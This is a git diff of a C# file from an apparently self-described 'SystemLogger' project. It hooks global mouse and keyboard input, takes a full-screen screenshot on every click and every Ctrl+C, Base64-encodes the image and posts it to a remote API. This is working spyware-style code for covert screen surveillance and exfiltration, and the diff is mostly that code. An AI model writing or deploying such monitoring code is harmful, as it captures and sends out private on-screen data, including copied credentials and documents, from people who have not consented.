@@ -1,16 +1,19 @@
 ﻿using Gma.System.MouseKeyHook;
 using System;
+using System.Buffers.Text;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using SystemLogger.Sender;
+using SystemLogger.Util;
 
 namespace SystemLogger.Watchers
 {
     internal class KeyboardAndMouse
     {
-        private static readonly string tempPath = System.IO.Path.GetTempPath();
+        
 
         private IMouseEvents _MouseHook;
 
@@ -32,14 +35,20 @@ namespace SystemLogger.Watchers
         public void DetectCombinationsAndClicks()
         {
             var map = new Dictionary<Combination, Action>{
-                {Combination.FromString("Control+C"),()=>{Console.WriteLine("Control + C detectado!");
-                                                          CaptureScreen(); } }
+                {Combination.FromString("Control+C"),()=>
+                    {
+                        Console.WriteLine("Control + C detectado!");
+                        ScreenshotEvent.CaptureScreen();
+                        sendToApi("control+c");
+                    } 
+                }
             };
 
             _MouseHook.MouseClick += (sender, e) =>
             {
-                Console.WriteLine("Click Detected");
-                CaptureScreen();
+                Console.WriteLine("Click Detectado");
+                ScreenshotEvent.CaptureScreen();
+                sendToApi("click");
             };
 
 
@@ -47,29 +56,21 @@ namespace SystemLogger.Watchers
             _KeyboardHook.OnCombination(map);
         }
 
-        private void _MouseHook_MouseClick(object? sender, MouseEventArgs e)
+        
+
+        private void sendToApi(string type)
         {
-            throw new NotImplementedException();
-        }
 
-        private void _hook_KeyDown(object? sender, KeyEventArgs e)
-        {
-            throw new NotImplementedException();
-        }
-
-        public void CaptureScreen()
-        {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            Bitmap captureBitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
-
-            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
-
-            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
-            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
-            
-            captureBitmap.Save(tempPath+ "\\capture.jpeg", ImageFormat.Jpeg);
-
-            Console.WriteLine("Print captured!");
+            string path = ScreenshotEvent.tempPath + "\\capture.jpeg";
+            string imgString = ImageConv.ConverterToBase64(path);
+            Object obj = new
+            {
+                tipoEvento = type,
+                timestamp = DateTime.Now,
+                image = imgString,
+            };
+            Console.WriteLine(obj);
+            PostToApi.Post(obj);
         }
 
     }
